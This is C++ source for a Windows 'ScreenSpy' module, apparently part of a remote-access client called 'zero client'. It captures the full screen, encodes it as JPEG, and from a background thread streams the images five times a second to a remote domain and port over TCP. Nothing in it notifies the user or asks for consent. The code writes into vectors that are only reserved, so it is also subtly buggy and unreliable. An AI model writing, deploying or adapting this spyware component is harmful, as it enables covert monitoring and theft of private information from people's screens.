#include "screenspy.h"


static CRITICAL_SECTION gCs;
static ScreenSpy gSpy;

ScreenSpy::ScreenSpy()
{
    InitializeCriticalSection(&gCs);
}

ScreenSpy::~ScreenSpy()
{
    DeleteCriticalSection(&gCs);
}

bool ScreenSpy::captureScreen(std::vector<unsigned char> &bmpData)
{
    EnterCriticalSection(&gCs);

    HBITMAP hBitmap;

    HDC hScrDC = CreateDCA(_T("DISPLAY"),NULL,NULL,NULL);
    if(!hScrDC) {
        std::cout << "Failed to get screen device" << std::endl;


        LeaveCriticalSection(&gCs);
        return false;
    }

    HDC hRamDC = CreateCompatibleDC(hScrDC);
    if(!hRamDC) {
        std::cout << "Failed to create device" << std::endl;


        LeaveCriticalSection(&gCs);
        return false;
    }

    unsigned int iByte = 3;
    unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
    unsigned int iHeigth = GetSystemMetrics(SM_CYSCREEN);
    unsigned int iBmpSize = iWidth * iHeigth * iByte;
    if(iWidth == 1366) {
        iWidth = 1360;
    }

    BITMAPINFOHEADER bmpInfoHeader;
    BITMAPINFO bmpInfo;
    void *p;

    bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmpInfoHeader.biBitCount = 32;
    bmpInfoHeader.biPlanes = 1;
    bmpInfoHeader.biCompression = BI_RGB;
    bmpInfoHeader.biWidth = iWidth;
    bmpInfoHeader.biHeight = iHeigth;
    bmpInfo.bmiHeader = bmpInfoHeader;

    hBitmap = CreateDIBSection(hScrDC,&bmpInfo,DIB_RGB_COLORS,&p,NULL,0);
    if(!hBitmap) {
        std::cout << "Failed to CreateDIBSection" << std::endl;


        LeaveCriticalSection(&gCs);
        return false;
    }

    HBITMAP hBitmapOld;
    hBitmapOld = (HBITMAP)SelectObject(hRamDC,hBitmap);

    StretchBlt(hRamDC,0,0,iWidth,iHeigth,hScrDC,0,0,iWidth,iHeigth,SRCCOPY);

    bmpData.reserve(iBmpSize);
    HDC hTmpDC = GetDC(NULL);
    hBitmap = (HBITMAP)SelectObject(hRamDC,hBitmapOld);

    bmpInfoHeader.biBitCount = 24;
    int iError = GetDIBits(hTmpDC,hBitmap,0,iHeigth,&bmpData[0],(BITMAPINFO *)&bmpInfoHeader,DIB_RGB_COLORS);
    if(!iError) {
        std::cout << "Failed to GetDIBits" << std::endl;


        LeaveCriticalSection(&gCs);
        return false;
    }

    DeleteDC(hScrDC);
    DeleteDC(hRamDC);
    DeleteObject(hBitmapOld);
    DeleteDC(hTmpDC);
    DeleteObject(hBitmap);

    LeaveCriticalSection(&gCs);
    return true;
}

unsigned int  ScreenSpy::convertToJpgData(const std::vector<unsigned char> &bmpData,
                                 std::vector<unsigned char> &jpgData)
{
    EnterCriticalSection(&gCs);

    unsigned int iByte = 3;
    unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
    unsigned int iHeigth = GetSystemMetrics(SM_CYSCREEN);
    unsigned int iBmpSize = iWidth * iHeigth * iByte;
    if(iWidth == 1366) {
        iWidth = 1360;
    }

    const unsigned char *bmp = &bmpData[0];
    std::vector<unsigned char> convertedBmp;
    convertedBmp.reserve(iBmpSize);
    unsigned char *cBmp = (unsigned char*)&convertedBmp[0];

    for(unsigned int i = 0,j;i < iHeigth;i ++) {
        for(j = 0;j < iWidth;j ++) {
            cBmp[i * iWidth *  iByte + j * 3] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte + 2];
            cBmp[i * iWidth *  iByte + j * 3 + 1] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte + 1];
            cBmp[i * iWidth *  iByte + j * 3 + 2] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte];
        }
    }

    struct jpeg_compress_struct jcs;
    struct jpeg_error_mgr jem;

    jcs.err = jpeg_std_error(&jem);
    jpeg_create_compress(&jcs);

    jcs.image_height = iHeigth;
    jcs.image_width = iWidth;
    jcs.input_components = iByte;
    jcs.in_color_space = JCS_RGB;

    jpeg_set_defaults(&jcs);

    const int quality = 30;
    jpeg_set_quality(&jcs, quality, TRUE);

    const std::string fileName= "zero_client_screen_capture.tmp";
    FILE *fp = fopen(fileName.data(),"wb+");
    if (!fp) {
        std::cout << "Failed to create file " << fileName << " error:"
                  << ferror(fp) <<std::endl;

        LeaveCriticalSection(&gCs);
        return 0;
    }

    jpeg_stdio_dest(&jcs,fp);

    jpeg_start_compress(&jcs,TRUE);
    JSAMPROW jr;
    while(jcs.next_scanline < iHeigth) {
        jr = &cBmp[jcs.next_scanline * iWidth * iByte];
        jpeg_write_scanlines(&jcs,&jr,1);
    }

    jpeg_finish_compress(&jcs);
    jpeg_destroy_compress(&jcs);
    fclose(fp);

    FILE *fpIn = fopen(fileName.data(),"rb+");
    if(!fpIn) {
        std::cout << "Failed to read file " << fileName << " error:"
                  << ferror(fp) <<std::endl;

        LeaveCriticalSection(&gCs);
        return 0;
    }

    fseek(fpIn,0,SEEK_END);
    size_t iLen = ftell(fpIn);
    rewind(fpIn);

    jpgData.reserve(iLen);
    fread((unsigned char*)&jpgData[0] , 1 , iLen ,fpIn);

    fclose(fpIn);

    DeleteFileA(fileName.data());

    LeaveCriticalSection(&gCs);
    return iLen;
}

void ScreenSpy::startByNewThread(std::string domain, int port)
{
    char *args = new char[MAX_PATH+sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args,domain.data(), MAX_PATH);
    memcpy(args+MAX_PATH,(char*)&port, sizeof(int));

    HANDLE h = CreateThread(NULL,0,ScreenSpy::threadProc,(LPVOID)args,0,NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;

    }
}

DWORD WINAPI ScreenSpy::threadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args+MAX_PATH));
    startScreenSpy(domain, port);

    delete (char *)args;
    return true;
}

void ScreenSpy::startScreenSpy(std::string domain, int port)
{
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect screen spy server " <<
                     domain << ":" << port << std::endl;
   
        return;
    }

    std::cout << "Started screen spy" << std::endl;


    const int fps = 5;
    do {
        Sleep(1000/fps);

        std::vector<unsigned char> bmp, jpg;

        if (!captureScreen(bmp)) {
            sock.dissconnect();
            break;
        }

        unsigned int len = 0;
        if ((len = convertToJpgData(bmp, jpg)) == 0) {
            sock.dissconnect();
            break;
        }

        if (!sendScreenData(&sock, jpg, len)) {
            break;
        }
    } while (1);

    std::cout << "Finished screen spy" << std::endl;
 
}

bool ScreenSpy::sendScreenData(TcpSocket *sock, std::vector<unsigned char> &jpg,unsigned int len)
{
    ScreenSpyHeader header;
    header.len = len;
    if (!sock->sendData((char*)&header, sizeof(ScreenSpyHeader))) {
        return false;
    }

    const unsigned int paketLen = 800;
    char *data = (char *)&jpg[0];
    unsigned int pos = 0;

    while (pos < len) {
        int sendSize = (pos+paketLen) > len ? len-pos : paketLen;

        if (!sock->sendData(data+pos, sendSize)) {
            return false;
        }

        pos += sendSize;
    }

    return true;
}

